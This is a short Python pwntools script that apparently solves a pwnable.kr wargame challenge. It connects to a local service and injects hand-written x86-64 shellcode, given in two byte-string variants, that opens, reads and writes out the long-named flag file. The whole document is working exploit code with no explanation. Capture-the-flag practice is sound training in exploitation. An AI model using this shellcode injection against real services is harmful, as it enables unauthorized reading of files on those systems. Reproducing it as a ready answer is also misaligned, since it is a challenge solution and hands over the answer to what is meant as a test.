from pwn import *

s = remote('0.0.0.0', 9026)

filename = "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00"

#read(), write(), open()
payload = "\x31\xc0\x31\xff\x31\xd2\xb2\xea\xbe\x01\x01\x01\x01\x81\xf6\x01\x44\x40\x40\x0f\x05\xbf\x01\x01\x01\x01\x81\xf7\x01\x44\x40\x40\x31\xd2\xb6\x01\x31\xf6\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xc0\x6a\x64\x5a\xbe\x01\x01\x01\x01\x81\xf6\x01\x46\x40\x40\x0f\x05\x6a\x01\x5f\x6a\x64\x5a\xbe\x01\x01\x01\x01\x81\xf6\x01\x46\x40\x40\x6a\x01\x58\x0f\x05"

#SYS_read(), SYS_write(), SYS_open()
payload2 = "\x31\xc0\x31\xff\x31\xd2\xb2\xea\xbe\x01\x01\x01\x01\x81\xf6\x01\x44\x40\x40\x0f\x05\x6a\x02\x58\xbf\x01\x01\x01\x01\x81\xf7\x01\x44\x40\x40\x31\xd2\xb6\x01\x31\xf6\x0f\x05\x48\x89\xc7\x31\xc0\x6a\x64\x5a\xbe\x01\x01\x01\x01\x81\xf6\x01\x46\x40\x40\x0f\x05\x6a\x01\x58\x6a\x01\x5f\x6a\x64\x5a\xbe\x01\x01\x01\x01\x81\xf6\x01\x46\x40\x40\x0f\x05"

s.sendafter('shellcode: ', payload)

sleep(0.1)
s.send(filename)
print s.recvuntil('\x0a')
